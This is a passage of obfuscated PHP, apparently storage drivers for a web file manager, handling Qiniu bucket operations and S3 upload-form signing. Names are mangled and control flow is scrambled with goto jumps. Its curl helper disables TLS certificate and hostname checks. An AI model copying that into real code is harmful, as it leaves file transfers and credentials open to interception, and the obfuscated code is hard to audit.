$eóõÔ·ˆÖŸ . $Aà¦è³¢Ú˜[8]; $b¿ˆîÄëà = get_path_this($eóõÔ·ˆÖŸ); $F”§ÇÎ¯µ³ = $A¬‡îãË¥Ò . $b¿ˆîÄëà; goto b¾©‘à½Ñ­; b¾©‘à½Ñ­: if (!$this->mkfile($F”§ÇÎ¯µ³)) { return !1; } if (!$this->moveFile($F”§ÇÎ¯µ³, $A¬‡îãË¥Ò)) { $this->delFile($F”§ÇÎ¯µ³); return !1; } return $this->getPathOuter($eóõÔ·ˆÖŸ); goto F™ßö„²°; F­íèÊÑĞ•: $Aà¦è³¢Ú˜ =& $_SERVER[İë¬“ÅÒÛ›]; $eóõÔ·ˆÖŸ = trim($A¬‡îãË¥Ò, $Aà¦è³¢Ú˜[8]); if ($this->_isFolder($eóõÔ·ˆÖŸ)) { return $this->getPathOuter($eóõÔ·ˆÖŸ); } goto cŒ¾Ûä©‚–; F™ßö„²°: } public function copyFile($Aºñ¶Ã”Â­, $D¹Íß½ÛÏÏ) { $DªË¹í‹¶Á = $this->bucketManager->copy($this->bucket, $Aºñ¶Ã”Â­, $this->bucket, $D¹Íß½ÛÏÏ, !0); return $DªË¹í‹¶Á ? !1 : !0; } public function moveFile($Cà…õƒà¦, $eÏÚ…Â™í) { $DÑÆ¢ƒº§ = $this->bucketManager->move($this->bucket, $Cà…õƒà¦, $this->bucket, $eÏÚ…Â™í, !0); return $DÑÆ¢ƒº§ ? !1 : !0; } public function delFile($B±éÜ¸˜Ü) { $fÀ±•ˆÖî— = $this->bucketManager->delete($this->bucket, $B±éÜ¸˜Ü); return $fÀ±•ˆÖî— ? !1 : !0; } public function delFolder($Fù¯³„İŒ²) { $fˆ¨Š¶¥•Ğ = $this->fileList($Fù¯³„İŒ²); if (empty($fˆ¨Š¶¥•Ğ)) { return !0; } $f–”¼å´§“ = 1000; if (count($fˆ¨Š¶¥•Ğ) <= $f–”¼å´§“) { return $this->qnDelObj($fˆ¨Š¶¥•Ğ) ? !1 : !0; } foreach (array_chunk($fˆ¨Š¶¥•Ğ, $f–”¼å´§“) as $f¸˜§‹¿šø) { $FÁŸº¸õ½© = $this->qnDelObj($f¸˜§‹¿šø); if ($FÁŸº¸õ½©) { return !1; } } return !0; } private function qnDelObj($aéŞÆŠĞ½½) { $cñê·Â¿Ø³ = $this->bucketManager->buildBatchDelete($this->bucket, $aéŞÆŠĞ½½); list($A íÖŸ‚’è, $b¿­¶øƒä°) = $this->bucketManager->batch($cñê·Â¿Ø³); return $b¿­¶øƒä°; } private function fileList($e©­ğ¡ŞÇÛ, $E°œ²óğ´ = 0) { goto a«¥ß‘ÕŒ; CÎ»›Èó¡: $AŠŒçòØÀë = array(); while (!0) { list($E‹Â˜ŸÊÆ², $CŞÔ„ƒÔçí) = $this->bucketManager->listFiles($this->bucket, $A«„À¿é­Å, $b¶ÆëƒÄ™ê, $B²‰Ÿ“¬¤, $E”¯®¾åÀ»); if ($CŞÔ„ƒÔçí) { return !1; } $b¶ÆëƒÄ™ê = array_key_exists($CÊŠÍÉÔÄ¿[920], $E‹Â˜ŸÊÆ²) ? $b¶ÆëƒÄ™ê = $E‹Â˜ŸÊÆ²[$CÊŠÍÉÔÄ¿[955]] : $CÊŠÍÉÔÄ¿[33]; foreach ($E‹Â˜ŸÊÆ²[$CÊŠÍÉÔÄ¿[956]] as $fŸÁº³…«) { $F…¢ìÆï§œ = $fŸÁº³…«[$CÊŠÍÉÔÄ¿[88]]; if ($E°œ²óğ´) { $F…¢ìÆï§œ = array($CÊŠÍÉÔÄ¿[28] => $F…¢ìÆï§œ, $CÊŠÍÉÔÄ¿[78] => $fŸÁº³…«[$CÊŠÍÉÔÄ¿[957]]); } $AŠŒçòØÀë[] = $F…¢ìÆï§œ; } if ($b¶ÆëƒÄ™ê == $CÊŠÍÉÔÄ¿[33]) { break; } } return $AŠŒçòØÀë; goto bÔÉÂÀÓÃ³; b•¿¡ÈëÔ: $b¶ÆëƒÄ™ê = $CÊŠÍÉÔÄ¿[33]; $B²‰Ÿ“¬¤ = 1000; $E”¯®¾åÀ» = $CÊŠÍÉÔÄ¿[33]; goto CÎ»›Èó¡; a«¥ß‘ÕŒ: $CÊŠÍÉÔÄ¿ =& $_SERVER[İë¬“ÅÒÛ›]; $e©­ğ¡ŞÇÛ = trim($e©­ğ¡ŞÇÛ, $CÊŠÍÉÔÄ¿[8]); $A«„À¿é­Å = empty($e©­ğ¡ŞÇÛ) ? $CÊŠÍÉÔÄ¿[33] : $e©­ğ¡ŞÇÛ . $CÊŠÍÉÔÄ¿[8]; goto b•¿¡ÈëÔ; bÔÉÂÀÓÃ³: } public function rename($cöÈŠ«øíÊ, $aº—ÂŒÂŒ) { return $this->renameObject($cöÈŠ«øíÊ, $aº—ÂŒÂŒ); } public function size($d¾‡¨Œ„Ò‚) { $eô›—Ş‡ï‡ =& $_SERVER[İë¬“ÅÒÛ›]; list($EÅØä½ò›ˆ, $Fò¤Çœõ§) = $this->bucketManager->stat($this->bucket, trim($d¾‡¨Œ„Ò‚, $eô›—Ş‡ï‡[8])); return isset($EÅØä½ò›ˆ[$eô›—Ş‡ï‡[957]]) ? $EÅØä½ò›ˆ[$eô›—Ş‡ï‡[957]] : 0; } public function _info($eâÓÉî‹¨) { $eâÓÉî‹¨ = trim($eâÓÉî‹¨, $_SERVER[İë¬“ÅÒÛ›][8]); if ($this->_isFolder($eâÓÉî‹¨)) { return $this->folderInfo($eâÓÉî‹¨); } return $this->fileInfo($eâÓÉî‹¨); } public function fileInfo($F©ãÇ—©ç‰, $däÀÚË–º = array(), $EÑ˜­‘—° = false) { goto F÷·›÷·¿‘; FëâŞÈèÁ»: return $cŠÓ‰á±…‡; goto dâ¢ä¶Â„á; D¾¤İœôî: if (empty($däÀÚË–º)) { list($däÀÚË–º, $FÅ‘ğÜ’ŞÜ) = $this->bucketManager->stat($this->bucket, $F©ãÇ—©ç‰); if ($FÅ‘ğÜ’ŞÜ) { return $cŠÓ‰á±…‡; } $this->fileInfoImage($F©ãÇ—©ç‰, $cŠÓ‰á±…‡); } $cŠÓ‰á±…‡[$dˆö®¾áÑ‹[187]] = substr($däÀÚË–º[$dˆö®¾áÑ‹[958]], 0, -7); $cŠÓ‰á±…‡[$dˆö®¾áÑ‹[78]] = $däÀÚË–º[$dˆö®¾áÑ‹[957]]; goto FëâŞÈèÁ»; F÷·›÷·¿‘: $dˆö®¾áÑ‹ =& $_SERVER[İë¬“ÅÒÛ›]; if ($EÑ˜­‘—°) { return array($dˆö®¾áÑ‹[28] => $this->pathThis($F©ãÇ—©ç‰), $dˆö®¾áÑ‹[76] => $this->getPathOuter($dˆö®¾áÑ‹[8] . $F©ãÇ—©ç‰), $dˆö®¾áÑ‹[29] => $dˆö®¾áÑ‹[164], $dˆö®¾áÑ‹[78] => isset($däÀÚË–º[$dˆö®¾áÑ‹[957]]) ? $däÀÚË–º[$dˆö®¾áÑ‹[957]] : 0, $dˆö®¾áÑ‹[157] => $this->ext($F©ãÇ—©ç‰)); } $cŠÓ‰á±…‡ = array($dˆö®¾áÑ‹[28] => $this->pathThis($F©ãÇ—©ç‰), $dˆö®¾áÑ‹[76] => $this->getPathOuter($dˆö®¾áÑ‹[8] . $F©ãÇ—©ç‰), $dˆö®¾áÑ‹[29] => $dˆö®¾áÑ‹[164], $dˆö®¾áÑ‹[187] => $dˆö®¾áÑ‹[50], $dˆö®¾áÑ‹[106] => $dˆö®¾áÑ‹[50], $dˆö®¾áÑ‹[78] => 0, $dˆö®¾áÑ‹[157] => $this->ext($F©ãÇ—©ç‰), $dˆö®¾áÑ‹[188] => !0, $dˆö®¾áÑ‹[189] => !0); goto D¾¤İœôî; dâ¢ä¶Â„á: } public function folderInfo($Aœ³Æß‹Š, $AÊÒ‚Çâ¢ = false) { $Cí’ŒÒîà =& $_SERVER[İë¬“ÅÒÛ›]; if ($AÊÒ‚Çâ¢) { return array($Cí’ŒÒîà[28] => $this->pathThis($Aœ³Æß‹Š), $Cí’ŒÒîà[76] => $this->getPathOuter($Cí’ŒÒîà[8] . $Aœ³Æß‹Š), $Cí’ŒÒîà[29] => $Cí’ŒÒîà[77]); } $BÎ¸ÒôšÒ = array($Cí’ŒÒîà[28] => $this->pathThis($Aœ³Æß‹Š), $Cí’ŒÒîà[76] => $this->getPathOuter($Cí’ŒÒîà[8] . $Aœ³Æß‹Š), $Cí’ŒÒîà[29] => $Cí’ŒÒîà[77], $Cí’ŒÒîà[187] => $Cí’ŒÒîà[50], $Cí’ŒÒîà[106] => $Cí’ŒÒîà[50], $Cí’ŒÒîà[897] => !0, $Cí’ŒÒîà[898] => !0); return $BÎ¸ÒôšÒ; } public function exist($C‹ÕÌøÔ‚¿) { if ($this->_isFile($C‹ÕÌøÔ‚¿) || $this->_isFolder($C‹ÕÌøÔ‚¿)) { return !0; } return !1; } public function info($báŒƒ¢­ë) { return $this->cacheMehod($_SERVER[İë¬“ÅÒÛ›][183], $báŒƒ¢­ë); } public function isFile($f»Òñá‘») { return $this->cacheMehod($_SERVER[İë¬“ÅÒÛ›][184], $f»Òñá‘»); } public function isFolder($aæ–‹†ÊÛ) { return $this->cacheMehod($_SERVER[İë¬“ÅÒÛ›][185], $aæ–‹†ÊÛ); } public function _isFile($Cİ…ÅäØ¿) { list($e¶Ä¿×Âî›, $e—Œ¸ö”µ) = $this->bucketManager->stat($this->bucket, trim($Cİ…ÅäØ¿, $_SERVER[İë¬“ÅÒÛ›][8])); return $e—Œ¸ö”µ ? !1 : !0; } public function _isFolder($eœ©†ÜÂÕ¶) { goto Aìßœéµ‹; c„¾ÉŞ¤¥Ø: $fŠÊÕ»ëâÔ = $CÃØÓà¿’[8]; list($B½¼£õŒ´‘, $F‰÷¨àØ) = $this->bucketManager->listFiles($this->bucket, $cª¦òÏĞ, $fœ‹ë¥§©¹, $cµÉ÷Ğ“”›, $fŠÊÕ»ëâÔ); if (!empty($B½¼£õŒ´‘[$CÃØÓà¿’[956]]) || !empty($B½¼£õŒ´‘[$CÃØÓà¿’[959]])) { return !0; } goto a–ÈŠ„©õ™; a–ÈŠ„©õ™: return !1; goto fÉÒÜÂŞ; aƒ„Ë›œœŠ: $cª¦òÏĞ = trim($eœ©†ÜÂÕ¶, $CÃØÓà¿’[8]) . $CÃØÓà¿’[8]; $fœ‹ë¥§©¹ = $CÃØÓà¿’[33]; $cµÉ÷Ğ“”› = 1; goto c„¾ÉŞ¤¥Ø; Aìßœéµ‹: $CÃØÓà¿’ =& $_SERVER[İë¬“ÅÒÛ›]; $f³Ü‚ƒ¿Ûğ = trim($eœ©†ÜÂÕ¶, $CÃØÓà¿’[8]); if (empty($f³Ü‚ƒ¿Ûğ)) { return !0; } goto aƒ„Ë›œœŠ; fÉÒÜÂŞ: } public function listPath($e¾Öùö‡™‡, $C–—Š´“·ğ = false) { goto câÔš“¼÷£; eùàŠ”æ×¨: $fÅƒõ—„ = $aç…àÏ®®ò[33]; $EÎ“æïë»° = 1000; $aéì·‚÷…Ì = $aç…àÏ®®ò[8]; goto A¯êâ”ù; câÔš“¼÷£: $aç…àÏ®®ò =& $_SERVER[İë¬“ÅÒÛ›]; $e¾Öùö‡™‡ = trim($e¾Öùö‡™‡, $aç…àÏ®®ò[8]); $FŠ°ë‚ê¬… = empty($e¾Öùö‡™‡) ? $aç…àÏ®®ò[33] : $e¾Öùö‡™‡ . $aç…àÏ®®ò[8]; goto eùàŠ”æ×¨; A¯êâ”ù: $b¸±·Ã„’ = $bñæ”ÌÜ¸ = array(); while (!0) { list($Eë‰ÈöÛÌö, $dÜÄ¾Ôõ·¢) = $this->bucketManager->listFiles($this->bucket, $FŠ°ë‚ê¬…, $fÅƒõ—„, $EÎ“æïë»°, $aéì·‚÷…Ì); if ($dÜÄ¾Ôõ·¢) { return !1; } $fÅƒõ—„ = array_key_exists($aç…àÏ®®ò[920], $Eë‰ÈöÛÌö) ? $fÅƒõ—„ = $Eë‰ÈöÛÌö[$aç…àÏ®®ò[955]] : $aç…àÏ®®ò[33]; if (isset($Eë‰ÈöÛÌö[$aç…àÏ®®ò[959]])) { foreach ($Eë‰ÈöÛÌö[$aç…àÏ®®ò[959]] as $aŒÑöë”£ì) { if ($aŒÑöë”£ì == $FŠ°ë‚ê¬…) { continue; } $b¸±·Ã„’[] = $this->folderInfo($aŒÑöë”£ì, $C–—Š´“·ğ); } } if (isset($Eë‰ÈöÛÌö[$aç…àÏ®®ò[956]])) { foreach ($Eë‰ÈöÛÌö[$aç…àÏ®®ò[956]] as $CóöÆ†Üë) { if ($CóöÆ†Üë[$aç…àÏ®®ò[88]] == $FŠ°ë‚ê¬…) { continue; } $bñæ”ÌÜ¸[] = $this->fileInfo($CóöÆ†Üë[$aç…àÏ®®ò[88]], $CóöÆ†Üë, $C–—Š´“·ğ); } } if ($fÅƒõ—„ == $aç…àÏ®®ò[33]) { break; } } return array($aç…àÏ®®ò[75] => $b¸±·Ã„’, $aç…àÏ®®ò[74] => $bñæ”ÌÜ¸); goto D…æ§Úòã; D…æ§Úòã: } public function has($A‡ˆ•’¸´©, $bÔ·ÆïÂˆ = false, $eÈóŞ¼³‹ = true) { goto F¹ŒµÎğÖğ; BàŠ¸‘ä¾­: if ($bÔ·ÆïÂˆ) { return array($A³›ù¶°Š[191] => $Dô¶ŒÆóÚ®, $A³›ù¶°Š[192] => $Bêã¦ˆ»ê); } return !1; goto E‚Óã±Û±Ô; E™‡—ß®“: $f–¢åñÏî = $A³›ù¶°Š[33]; $dÄê¸ÖÓØÁ = 500; $eÊÁé§Š‚¾ = $A³›ù¶°Š[8]; goto dÑÁ’ÏÆæ; F¹ŒµÎğÖğ: $A³›ù¶°Š =& $_SERVER[İë¬“ÅÒÛ›]; $A‡ˆ•’¸´© = trim($A‡ˆ•’¸´©, $A³›ù¶°Š[8]); $aòÔ³ÆÄ‚ = empty($A‡ˆ•’¸´©) ? $A³›ù¶°Š[33] : $A‡ˆ•’¸´© . $A³›ù¶°Š[8]; goto E™‡—ß®“; dÑÁ’ÏÆæ: $Dô¶ŒÆóÚ® = 0; $Bêã¦ˆ»ê = 0; while (!0) { list($D±¬ÏÙîêö, $Fí¦¬ÄË¡¤) = $this->bucketManager->listFiles($this->bucket, $aòÔ³ÆÄ‚, $f–¢åñÏî, $dÄê¸ÖÓØÁ, $eÊÁé§Š‚¾); if ($Fí¦¬ÄË¡¤) { return !1; } $f–¢åñÏî = array_key_exists($A³›ù¶°Š[920], $D±¬ÏÙîêö) ? $f–¢åñÏî = $D±¬ÏÙîêö[$A³›ù¶°Š[955]] : $A³›ù¶°Š[33]; if ($bÔ·ÆïÂˆ) { if (!empty($D±¬ÏÙîêö[$A³›ù¶°Š[956]])) { $Dô¶ŒÆóÚ® += count($D±¬ÏÙîêö[$A³›ù¶°Š[956]]); } if (!empty($D±¬ÏÙîêö[$A³›ù¶°Š[959]])) { $Bêã¦ˆ»ê += count($D±¬ÏÙîêö[$A³›ù¶°Š[959]]); } if ($f–¢åñÏî === $A³›ù¶°Š[33]) { break; } continue; } if ($eÈóŞ¼³‹) { if (!empty($D±¬ÏÙîêö[$A³›ù¶°Š[956]])) { return !0; } } else { if (!empty($D±¬ÏÙîêö[$A³›ù¶°Š[959]])) { return !0; } } if ($f–¢åñÏî == $A³›ù¶°Š[33]) { break; } } goto BàŠ¸‘ä¾­; E‚Óã±Û±Ô: } public function listAll($cÑÕŠÒÛÊ¨) { $Dó†‚¡ËÄÓ =& $_SERVER[İë¬“ÅÒÛ›]; $AáãªÖÁ±Ò = $this->fileList($cÑÕŠÒÛÊ¨, 1); $c…¡é¸é§ = array(); foreach ($AáãªÖÁ±Ò as $céÔ¡øªİÏ) { $c…¡é¸é§[$céÔ¡øªİÏ[$Dó†‚¡ËÄÓ[28]]] = $céÔ¡øªİÏ[$Dó†‚¡ËÄÓ[78]]; } return $this->listAllFiles($cÑÕŠÒÛÊ¨, array_keys($c…¡é¸é§), $c…¡é¸é§); } public function canRead($DøääÊï») { return $this->exist($DøääÊï») ? !0 : !1; } public function canWrite($AÒ’í„ºê‚) { return $this->exist($AÒ’í„ºê‚) ? !0 : !1; } public function getContent($DÓ²‰™÷¬¬) { return $this->fileSubstr($DÓ²‰™÷¬¬, 0, -1); } public function setContent($d°ˆšêËÑÒ, $a²ˆ‘ÈÅÔÔ = '') { $DÚ¤¿è¢ø÷ = $this->tempFile($this->pathThis($d°ˆšêËÑÒ)); file_put_contents($DÚ¤¿è¢ø÷, $a²ˆ‘ÈÅÔÔ); if ($this->upload($d°ˆšêËÑÒ, $DÚ¤¿è¢ø÷)) { $this->tempFileRemve($DÚ¤¿è¢ø÷); return !0; } return !1; } public function refreshUrls($cß‹¤ò±çĞ) { goto D•¦¸¤´Ç; fò–ŸÔ†¯: $Eã¾æêƒ¶¨ = new Qiniu\Cdn\CdnManager($this->auth); list($e Šñ„à¼Ä, $c£ˆ¥Ò±) = $Eã¾æêƒ¶¨->refreshUrls($bÑÊ¨Ê‹ô); if ($c£ˆ¥Ò±) { return !1; } goto aÆ¸óÂİ; aÆ¸óÂİ: return $e Šñ„à¼Ä[$CèŞö“ó¬µ[960]] == $CèŞö“ó¬µ[454] ? !0 : !1; goto dÔ²ƒäÕµ; D•¦¸¤´Ç: $CèŞö“ó¬µ =& $_SERVER[İë¬“ÅÒÛ›]; $bÑÊ¨Ê‹ô = array(); if (is_array($cß‹¤ò±çĞ)) { foreach ($cß‹¤ò±çĞ as $FãÛÜ„ƒèİ) { $bÑÊ¨Ê‹ô[] = $this->link($FãÛÜ„ƒèİ); } } else { $bÑÊ¨Ê‹ô[] = $this->link($cß‹¤ò±çĞ); } goto fò–ŸÔ†¯; dÔ²ƒäÕµ: } public function fileSubstr($EÛ…¨È—¼˜, $CãåìãÃ‹, $Eíİ…•îçŞ) { $aŒ˜¿´„Ù  =& $_SERVER[İë¬“ÅÒÛ›]; if (!($A»Ö–³Ò = $this->link($EÛ…¨È—¼˜))) { return !1; } $B‡ôÜßÂÒ = array($aŒ˜¿´„Ù [923] => $CãåìãÃ‹, $aŒ˜¿´„Ù [329] => $Eíİ…•îçŞ); return $this->qnRequest($A»Ö–³Ò, $B‡ôÜßÂÒ); } public function upload($Cµœà„«Ñ“, $d¾ÚĞîÛĞ¿, $bÉÛÓŠ‹ÅÚ = false, $EëĞ¨·Šˆ = REPEAT_REPLACE) { $aÂá›¬À´ = new Qiniu\Storage\UploadManager(); $f×§×ä“ÕÌ = $this->auth->uploadToken($this->bucket, $Cµœà„«Ñ“); $F‰Šêöïä = get_file_mime(get_path_ext($Aß”™‘†«)); list($aŞñĞ ‚–, $e•Œç’œË¾) = $aÂá›¬À´->putFile($f×§×ä“ÕÌ, $Cµœà„«Ñ“, $d¾ÚĞîÛĞ¿, null, $F‰Šêöïä); return $e•Œç’œË¾ ? !1 : $this->getPathOuter($Cµœà„«Ñ“); } public function uploadFormData($BãÔ‰îø—, $C»‚Ê†ë¨ = 3600) { return $this->uploadToken($BãÔ‰îø—, $C»‚Ê†ë¨); } public function multiUploadFormData($Bî¸Ş¥ğŞ, $FğÀÔŒÓß = 3600) { return $this->uploadToken($Bî¸Ş¥ğŞ, $FğÀÔŒÓß); } private function uploadToken($B¾®‹’÷”, $CÒïà“­œ = 3600) { goto A–¦±ÊÒ½; cºŞ‚§‘îÍ: $b¤Õ™Ä×ôˆ = http_type() . "\72\x2f\57\x75\160\x6c\x6f\x61\x64{$dÀ‹Ë¦®¬Í}\56\161\151\156\x69\x75\160\56\143\x6f\x6d\57"; return array($AĞ•Ì„ÅÚá[964] => $e¸ñÃ®ŠĞ, $AĞ•Ì„ÅÚá[965] => $b¤Õ™Ä×ôˆ); goto F”˜î¿ã¶; eË©‹¿åä: $D˜§Ğ£©åÍ = null; $e¸ñÃ®ŠĞ = $this->auth->uploadToken($this->bucket, $D˜§Ğ£©åÍ, $c¹¸…°«²æ, $CôÄğÊá£É, !0); $dÀ‹Ë¦®¬Í = empty($this->region) || $this->region == $AĞ•Ì„ÅÚá[963] ? $AĞ•Ì„ÅÚá[33] : $AĞ•Ì„ÅÚá[499] . $this->region; goto cºŞ‚§‘îÍ; A–¦±ÊÒ½: $AĞ•Ì„ÅÚá =& $_SERVER[İë¬“ÅÒÛ›]; $c¹¸…°«²æ = $CÒïà“­œ; $CôÄğÊá£É = array($AĞ•Ì„ÅÚá[961] => $AĞ•Ì„ÅÚá[962]); goto eË©‹¿åä; F”˜î¿ã¶: } public function download($DáÉŸÉÇÜ, $eÙøÖÓĞÂ›) { goto Fä¦À¸¾ÑÌ; aÏ·ó…Üµ‹: while (!0) { $d‘ÆåË¸Æ£ = array($aÚŒÚÈ––ê[923] => $bé½ì„®Ú, $aÚŒÚÈ––ê[329] => $B¡ŠÓ×ÑŠ±); $F“ñ¹×ÛéÀ = $this->qnRequest($f’‚ÒÂ¥¢, $d‘ÆåË¸Æ£); if ($bé½ì„®Ú && ($A±ôƒ©Â÷ = @json_decode($F“ñ¹×ÛéÀ, !0))) { if (isset($A±ôƒ©Â÷[$aÚŒÚÈ––ê[960]])) { return !1; } } fwrite($a³®ÛÁ¢•Ê, $F“ñ¹×ÛéÀ); $bé½ì„®Ú += $B¡ŠÓ×ÑŠ±; if (strlen($F“ñ¹×ÛéÀ) < $B¡ŠÓ×ÑŠ±) { break; } } fclose($a³®ÛÁ¢•Ê); return $eÙøÖÓĞÂ›; goto e¯ÄùÁ…¹¦; c‚Ì¶ï™†Ï: $bé½ì„®Ú = 0; $B¡ŠÓ×ÑŠ± = 1024 * 200; $a³®ÛÁ¢•Ê = fopen($F¹±µí½¯İ, $aÚŒÚÈ––ê[966]); goto aÏ·ó…Üµ‹; Fä¦À¸¾ÑÌ: $aÚŒÚÈ––ê =& $_SERVER[İë¬“ÅÒÛ›]; $F¹±µí½¯İ = IO::getPathInner(IO::mkfile($eÙøÖÓĞÂ›)); if (!($f’‚ÒÂ¥¢ = $this->link($DáÉŸÉÇÜ))) { return !1; } goto c‚Ì¶ï™†Ï; e¯ÄùÁ…¹¦: } public function link($F°ªÍ£ù¿—, $bœô†¶Àò = '') { if (!$this->isFile($F°ªÍ£ù¿—)) { return !1; } $bÅáÂÚÉÃî = $this->getHost() . $_SERVER[İë¬“ÅÒÛ›][8] . $this->pathEncode($F°ªÍ£ù¿—) . $bœô†¶Àò; return $this->auth->privateDownloadUrl($bÅáÂÚÉÃî, 3600 * 12); } public function fileOut($d£åîÍ¤åµ, $E–Øù”´Çä = false, $fÖº÷Á¹ÚÑ = false, $a¸–ù°ˆŞ = '') { $b²Ú¦ÅÅ±ç =& $_SERVER[İë¬“ÅÒÛ›]; if (!$fÖº÷Á¹ÚÑ) { $fÖº÷Á¹ÚÑ = $this->pathThis($d£åîÍ¤åµ); } $AÜ°š¦º = $E–Øù”´Çä ? $b²Ú¦ÅÅ±ç[967] . rawurlencode($fÖº÷Á¹ÚÑ) : $b²Ú¦ÅÅ±ç[33]; $aõºëË†× = $this->link($d£åîÍ¤åµ, $AÜ°š¦º); $this->fileOutLink($aõºëË†×); } public function fileOutServer($c½ñ²ùì„®, $cÑİÖÂ– = false, $c‘ˆ©„ÜŞ = false, $e÷ãè­Ù = '') { parent::fileOut($c½ñ²ùì„®, $cÑİÖÂ–, $c‘ˆ©„ÜŞ, $e÷ãè­Ù); } public function fileOutImage($C¬“·ğ¢¥â, $dâòéâ ¿ = 250) { $Dï¦£‰‰· = $this->link($C¬“·ğ¢¥â, $_SERVER[İë¬“ÅÒÛ›][968] . $dâòéâ ¿); $this->fileOutLink($Dï¦£‰‰·); } public function fileOutImageServer($AƒäÇÖ¡ãç, $cô­íëŒ…˜ = 250) { parent::fileOutImage($AƒäÇÖ¡ãç, $cô­íëŒ…˜); } public function fileOutLink($dáÓÓš–Ç) { header($_SERVER[İë¬“ÅÒÛ›][153] . $dáÓÓš–Ç); die; } public function hashMd5($fƒæ ê£Ê) { $FÍì×’×„ß =& $_SERVER[İë¬“ÅÒÛ›]; $C¶¹Æ»Ê = $this->link($fƒæ ê£Ê, $FÍì×’×„ß[969]); $a¼íê·ã = $this->qnRequest($C¶¹Æ»Ê, array(), !0); return !isset($a¼íê·ã[$FÍì×’×„ß[197]]) ? !1 : $a¼íê·ã[$FÍì×’×„ß[197]]; } private function fileInfoImage($e®®õëçŸ³, &$dÎÊÌ¢£­) { $bçÜØææ„ =& $_SERVER[İë¬“ÅÒÛ›]; if (!in_array($dÎÊÌ¢£­[$bçÜØææ„[157]], array($bçÜØææ„[208], $bçÜØææ„[158], $bçÜØææ„[209], $bçÜØææ„[210], $bçÜØææ„[211]))) { return; } if (!($Cõ‡—±øÙ‘ = $this->link($e®®õëçŸ³, $bçÜØææ„[970]))) { return !1; } if (!($cëµÊË¢—Ø = $this->qnRequest($Cõ‡—±øÙ‘, array(), !0))) { return !1; } $dÎÊÌ¢£­[$bçÜØææ„[212]] = array($bçÜØææ„[213] => $cëµÊË¢—Ø[$bçÜØææ„[213]], $bçÜØææ„[904] => $cëµÊË¢—Ø[$bçÜØææ„[214]]); } public function qnRequest($aÎÏˆİø±Õ, $eŸÏ¤‘ğŒ¸ = array(), $e¡„‰Ã‹‡‹ = false) { goto Eç¸æŸó®ç; AšÄ†È°: curl_close($Bçğˆ–¡Ç˜); if ($e¡„‰Ã‹‡‹) { return @json_decode($aãºÂïõÎ, !0); } return $aãºÂïõÎ; goto C«•Ğ·ê¥¿; BİˆÍ¥æßó: curl_setopt($Bçğˆ–¡Ç˜, CURLOPT_FOLLOWLOCATION, 1); $aãºÂïõÎ = curl_exec($Bçğˆ–¡Ç˜); curl_progress_end($Bçğˆ–¡Ç˜); goto AšÄ†È°; Eç¸æŸó®ç: $f“š—²éí =& $_SERVER[İë¬“ÅÒÛ›]; $Bçğˆ–¡Ç˜ = curl_init(); curl_setopt($Bçğˆ–¡Ç˜, CURLOPT_URL, $aÎÏˆİø±Õ); goto a¯œØ–¸ó; C’…‚Õù» : curl_setopt($Bçğˆ–¡Ç˜, CURLOPT_PROGRESSFUNCTION, $f“š—²éí[971]); curl_progress_start($Bçğˆ–¡Ç˜); if (isset($eŸÏ¤‘ğŒ¸[$f“š—²éí[923]]) && $eŸÏ¤‘ğŒ¸[$f“š—²éí[329]] > 0) { $E‰¤ö«£ê = $eŸÏ¤‘ğŒ¸[$f“š—²éí[923]]; $dªîöİö£œ = $eŸÏ¤‘ğŒ¸[$f“š—²éí[923]] + ($eŸÏ¤‘ğŒ¸[$f“š—²éí[329]] - 1); curl_setopt($Bçğˆ–¡Ç˜, CURLOPT_RANGE, "{$E‰¤ö«£ê}\x2d{$dªîöİö£œ}"); } goto BİˆÍ¥æßó; b—œ“ÔˆÜ…: curl_setopt($Bçğˆ–¡Ç˜, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($Bçğˆ–¡Ç˜, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($Bçğˆ–¡Ç˜, CURLOPT_NOPROGRESS, !1); goto C’…‚Õù» ; a¯œØ–¸ó: curl_setopt($Bçğˆ–¡Ç˜, CURLOPT_RETURNTRANSFER, 1); curl_setopt($Bçğˆ–¡Ç˜, CURLOPT_CONNECTTIMEOUT, 3600); curl_setopt($Bçğˆ–¡Ç˜, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto b—œ“ÔˆÜ…; C«•Ğ·ê¥¿: } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($bõ¾¤Ò¾¾é) { parent::__construct($bõ¾¤Ò¾¾é); } public function uploadFormData($Fõó÷‘´Œä, $B¾†õˆË­Á = 3600) { goto bÄëß½†¼; EŸ÷‡‚¸ã½: $A¢ÆµÛâ¶ = $d˜…½èÙÆ[872]; $E¤ç¦–ò–• = $B¾†õˆË­Á . $d˜…½èÙÆ[33]; $fŸ‘­æ±Œ = $d˜…½èÙÆ[840]; goto bé¢‡ß×¼‚; dÕ©ˆŞƒİÁ: $cë…Ò¿š¡ = hash_hmac($d˜…½èÙÆ[880], $eòõÇÍˆ«¡, $b¿øš†„’…, !0); $a÷ŒÎ‰Œí = hash_hmac($d˜…½èÙÆ[880], $A¢ÆµÛâ¶, $cë…Ò¿š¡, !0); $DÂàâŠ¿ñ = hash_hmac($d˜…½èÙÆ[880], $f¼ŠàÉÜ¢Ö, $a÷ŒÎ‰Œí); goto EÁ‰ÉŒÈ; EÁ‰ÉŒÈ: $fŒŞº©æ†Ğ = array($d˜…½èÙÆ[199] => $d˜…½èÙÆ[33], $d˜…½èÙÆ[882] => $d˜…½èÙÆ[33], $d˜…½èÙÆ[844] => $e‚é…Ç²É°, $d˜…½èÙÆ[848] => $fŸ‘­æ±Œ, $d˜…½èÙÆ[852] => $f¼ŠàÉÜ¢Ö, $d˜…½èÙÆ[883] => $cñ†°˜å‰î, $d˜…½èÙÆ[884] => $Fà‹Ô†¹ğÖ, $d˜…½èÙÆ[885] => $bõ÷¥Â³ÅŒ, $d˜…½èÙÆ[886] => $E¤ç¦–ò–•, $d˜…½èÙÆ[887] => $DÂàâŠ¿ñ, $d˜…½èÙÆ[166] => $this->getHost()); return $fŒŞº©æ†Ğ; goto BÄˆµÑ‰„; B®ìğ…ëˆ¬: $f¼ŠàÉÜ¢Ö = base64_encode(json_encode($Dš‚Ûªˆç)); $F­›æ”ÚÎ± = hash_hmac($d˜…½èÙÆ[880], $BÎ÷¶İÇØ, $d˜…½èÙÆ[881] . $this->secret, !0); $b¿øš†„’… = hash_hmac($d˜…½èÙÆ[880], $this->region, $F­›æ”ÚÎ±, !0); goto dÕ©ˆŞƒİÁ; bÄëß½†¼: $d˜…½èÙÆ =& $_SERVER[İë¬“ÅÒÛ›]; $e‚é…Ç²É° = $d˜…½èÙÆ[182]; 